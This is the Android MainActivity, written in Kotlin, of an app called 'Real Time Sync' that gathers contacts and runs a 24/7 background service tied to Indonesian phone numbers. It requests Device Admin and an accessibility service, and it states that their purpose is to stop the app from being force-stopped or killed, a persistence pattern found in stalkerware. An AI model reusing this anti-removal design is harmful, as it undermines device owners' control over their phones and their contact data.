package com.realtime.synccontact

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.text.Editable
import android.text.TextWatcher
import android.view.View
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.textfield.TextInputLayout
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.karumi.dexter.Dexter
import com.karumi.dexter.MultiplePermissionsReport
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.multi.MultiplePermissionsListener
import com.realtime.synccontact.admin.DeviceAdminReceiver
import com.realtime.synccontact.databinding.ActivityMainBinding
import com.realtime.synccontact.services.GuardianService
import com.realtime.synccontact.services.MainSyncService
import com.realtime.synccontact.utils.SharedPrefsManager

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var sharedPrefsManager: SharedPrefsManager
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var componentName: ComponentName
    private var permissionsGranted = false

    companion object {
        private const val REQUEST_CODE_DEVICE_ADMIN = 1001
        private const val REQUEST_CODE_OVERLAY = 1002
        private const val REQUEST_CODE_BATTERY_OPTIMIZATION = 1003
        private const val REQUEST_CODE_ACCESSIBILITY = 1004
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        sharedPrefsManager = SharedPrefsManager(this)
        devicePolicyManager = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        componentName = ComponentName(this, DeviceAdminReceiver::class.java)

        setupUI()
        checkExistingConfiguration()
    }

    private fun setupUI() {
        // Phone number validation
        binding.etPhone1.addTextChangedListener(PhoneNumberWatcher(binding.tilPhone1))
        binding.etPhone2.addTextChangedListener(PhoneNumberWatcher(binding.tilPhone2))

        binding.btnStart.setOnClickListener {
            when (binding.btnStart.text.toString()) {
                "START SYNC SERVICE" -> startService()
                "STOP SERVICE" -> stopService()
                "UPDATE & RESTART" -> updateAndRestart()
            }
        }

        // Enable phone number editing when service is running
        binding.etPhone1.addTextChangedListener(object : TextWatcher {
            override fun afterTextChanged(s: Editable?) {
                checkIfPhoneNumbersChanged()
            }
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
        })

        binding.etPhone2.addTextChangedListener(object : TextWatcher {
            override fun afterTextChanged(s: Editable?) {
                checkIfPhoneNumbersChanged()
            }
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
        })
    }

    private fun startService() {
        val phone1 = binding.etPhone1.text.toString().trim()
        val phone2 = binding.etPhone2.text.toString().trim()

        if (validatePhoneNumbers(phone1, phone2)) {
            binding.progressBar.visibility = View.VISIBLE
            binding.btnStart.isEnabled = false
            updateStatus("Requesting permissions...")

            // Save phone numbers
            sharedPrefsManager.savePhoneNumbers(phone1, phone2)

            // Start permission flow
            requestAllPermissions()
        }
    }

    private fun stopService() {
        AlertDialog.Builder(this)
            .setTitle("Stop Service")
            .setMessage("Are you sure you want to stop the sync service?")
            .setPositiveButton("Yes") { _, _ ->
                // Stop the service
                val intent = Intent(this, MainSyncService::class.java)
                stopService(intent)

                // Update preferences
                sharedPrefsManager.setServiceStarted(false)

                // Update UI
                binding.btnStart.text = "START SYNC SERVICE"
                binding.btnStart.isEnabled = true
                binding.etPhone1.isEnabled = true
                binding.etPhone2.isEnabled = true
                updateStatus("Service stopped")
            }
            .setNegativeButton("No", null)
            .show()
    }

    private fun updateAndRestart() {
        val phone1 = binding.etPhone1.text.toString().trim()
        val phone2 = binding.etPhone2.text.toString().trim()

        if (validatePhoneNumbers(phone1, phone2)) {
            AlertDialog.Builder(this)
                .setTitle("Update Phone Numbers")
                .setMessage("This will restart the service with new phone numbers. Continue?")
                .setPositiveButton("Yes") { _, _ ->
                    // Stop current service
                    val stopIntent = Intent(this, MainSyncService::class.java)
                    stopService(stopIntent)

                    // Save new numbers
                    sharedPrefsManager.savePhoneNumbers(phone1, phone2)

                    // Restart service with a brief delay
                    Handler(Looper.getMainLooper()).postDelayed({
                        val startIntent = Intent(this, MainSyncService::class.java)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(startIntent)
                        } else {
                            startService(startIntent)
                        }

                        binding.btnStart.text = "STOP SERVICE"
                        updateStatus("Service restarted with new numbers")
                    }, 1000)
                }
                .setNegativeButton("No", null)
                .show()
        }
    }

    private fun checkIfPhoneNumbersChanged() {
        if (MainSyncService.isRunning(this)) {
            val (savedPhone1, savedPhone2) = sharedPrefsManager.getPhoneNumbers()
            val currentPhone1 = binding.etPhone1.text.toString().trim()
            val currentPhone2 = binding.etPhone2.text.toString().trim()

            if (currentPhone1 != savedPhone1 || currentPhone2 != savedPhone2) {
                binding.btnStart.text = "UPDATE & RESTART"
                binding.btnStart.isEnabled = true
            } else {
                binding.btnStart.text = "STOP SERVICE"
                binding.btnStart.isEnabled = true
            }
        }
    }

    private fun checkExistingConfiguration() {
        val (phone1, phone2) = sharedPrefsManager.getPhoneNumbers()
        if (phone1.isNotEmpty() && phone2.isNotEmpty()) {
            binding.etPhone1.setText(phone1)
            binding.etPhone2.setText(phone2)

            if (MainSyncService.isRunning(this)) {
                updateStatus("Service is running")
                binding.btnStart.text = "STOP SERVICE"
                binding.btnStart.isEnabled = true
                // Keep phone fields enabled for editing
                binding.etPhone1.isEnabled = true
                binding.etPhone2.isEnabled = true
            } else {
                binding.btnStart.text = "START SYNC SERVICE"
                binding.btnStart.isEnabled = true
            }
        }
    }

    private fun validatePhoneNumbers(phone1: String, phone2: String): Boolean {
        var isValid = true

        // First phone number is REQUIRED
        if (!phone1.startsWith("628") || phone1.length < 10) {
            binding.tilPhone1.error = "Invalid number. Must start with 628 and be at least 10 digits"
            isValid = false
        } else {
            binding.tilPhone1.error = null
        }

        // Second phone number is OPTIONAL
        if (phone2 == "628") return isValid

        if (phone2.isNotEmpty()) {
            // If provided, must be valid
            if (!phone2.startsWith("628") || phone2.length < 10) {
                binding.tilPhone2.error = "Invalid number. Must start with 628 and be at least 10 digits (or leave empty)"
                isValid = false
            } else if (phone1 == phone2) {
                binding.tilPhone2.error = "Numbers must be different"
                isValid = false
            } else {
                binding.tilPhone2.error = null
            }
        } else {
            // Empty second phone number is OK - clear any errors
            binding.tilPhone2.error = null
        }

        return isValid
    }

    private fun requestAllPermissions() {
        // Step 1: Request basic permissions
        val permissions = mutableListOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.FOREGROUND_SERVICE
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        Dexter.withContext(this)
            .withPermissions(permissions)
            .withListener(object : MultiplePermissionsListener {
                override fun onPermissionsChecked(report: MultiplePermissionsReport) {
                    if (report.areAllPermissionsGranted()) {
                        updateStatus("Basic permissions granted")
                        requestBatteryOptimizationExemption()
                    } else {
                        showPermissionError("Some permissions were denied. The app cannot function without all permissions.")
                        FirebaseCrashlytics.getInstance().log("Permissions denied: ${report.deniedPermissionResponses}")
                    }
                }

                override fun onPermissionRationaleShouldBeShown(
                    permissions: List<PermissionRequest>,
                    token: PermissionToken
                ) {
                    AlertDialog.Builder(this@MainActivity)
                        .setTitle("Permissions Required")
                        .setMessage("This app requires all permissions to sync contacts in real-time 24/7. Please grant all permissions.")
                        .setPositiveButton("Grant") { _, _ -> token.continuePermissionRequest() }
                        .setNegativeButton("Cancel") { _, _ ->
                            token.cancelPermissionRequest()
                            showPermissionError("Permissions are required for the app to function")
                        }
                        .setCancelable(false)
                        .show()
                }
            }).check()
    }

    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                updateStatus("Requesting battery optimization exemption...")
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivityForResult(intent, REQUEST_CODE_BATTERY_OPTIMIZATION)
            } else {
                requestOverlayPermission()
            }
        } else {
            requestOverlayPermission()
        }
    }

    private fun requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                updateStatus("Requesting overlay permission...")
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
                startActivityForResult(intent, REQUEST_CODE_OVERLAY)
            } else {
                requestDeviceAdminPermission()
            }
        } else {
            requestDeviceAdminPermission()
        }
    }

    private fun requestDeviceAdminPermission() {
//        requestAccessibilityService()
//        //no need to use device admin
        if (!devicePolicyManager.isAdminActive(componentName)) {
            updateStatus("Requesting Device Admin permission...")
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Device Admin permission is required to prevent the app from being force-stopped, ensuring 24/7 operation.")
            startActivityForResult(intent, REQUEST_CODE_DEVICE_ADMIN)
        } else {
            requestAccessibilityService()
        }
    }

    private fun requestAccessibilityService() {
        if (!isAccessibilityServiceEnabled()) {
            updateStatus("Accessibility Service")
            AlertDialog.Builder(this)
                .setTitle("Enable Accessibility Service")
                .setMessage("Enabling Real Time Sync accessibility service provides extra protection against the app being killed.")
                .setPositiveButton("Enable") { _, _ ->
                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    startActivityForResult(intent, REQUEST_CODE_ACCESSIBILITY)
                }
                .setCancelable(false)
                .show()
        } else {
            allPermissionsGranted()
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val service = "$packageName/${GuardianService::class.java.canonicalName}"
        val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        return enabledServices?.contains(service) == true
    }

    private fun allPermissionsGranted() {
        permissionsGranted = true
        updateStatus("All permissions granted! Starting service...")
        binding.progressBar.visibility = View.GONE

        // Start the main sync service
        startSyncService()
    }

    private fun startSyncService() {
        try {
            val intent = Intent(this, MainSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }

            // Mark service as started
            sharedPrefsManager.setServiceStarted(true)

            updateStatus("Service started successfully!")
            binding.btnStart.text = "STOP SERVICE"
            binding.btnStart.isEnabled = true

            // Show success dialog
            AlertDialog.Builder(this)
                .setTitle("Success")
                .setMessage("Real Time Sync service is now running. The app will sync contacts 24/7 in the background.\n\nYou can:\n• Close this app (service continues running)\n• Stop the service using the STOP button\n• Update phone numbers and restart")
                .setPositiveButton("OK", null)
                .show()

        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().recordException(e)
            updateStatus("Failed to start service: ${e.message}")
            binding.btnStart.isEnabled = true
        }
    }

    private fun updateStatus(status: String) {
        binding.tvStatus.text = "Status: $status"
    }

    private fun showPermissionError(message: String) {
        binding.progressBar.visibility = View.GONE
        binding.btnStart.isEnabled = true
        updateStatus("Permission error")

        AlertDialog.Builder(this)
            .setTitle("Permission Required")
            .setMessage(message)
            .setPositiveButton("Retry") { _, _ ->
                binding.btnStart.performClick()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        when (requestCode) {
            REQUEST_CODE_BATTERY_OPTIMIZATION -> {
                requestOverlayPermission()
            }
            REQUEST_CODE_OVERLAY -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
                    requestDeviceAdminPermission()
                } else {
                    showPermissionError("Overlay permission is required for the app to function")
                }
            }
            REQUEST_CODE_DEVICE_ADMIN -> {
                if (devicePolicyManager.isAdminActive(componentName)) {
                    requestAccessibilityService()
                } else {
                    showPermissionError("Device Admin permission is required to prevent force-stop")
                }
            }
            REQUEST_CODE_ACCESSIBILITY -> {
                if (isAccessibilityServiceEnabled()) {
                    allPermissionsGranted()
                } else {
                    showPermissionError("Accessibility Service must be enabled for 24/7 operation")
                }
            }
        }
    }

    inner class PhoneNumberWatcher(private val textInputLayout: TextInputLayout) : TextWatcher {
        override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
        override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
        override fun afterTextChanged(s: Editable?) {
            s?.let {
                if (it.isNotEmpty() && !it.startsWith("628")) {
                    it.clear()
                    it.append("628")
                    textInputLayout.error = "Number must start with 628"
                } else {
                    textInputLayout.error = null
                }
            }
        }
    }
}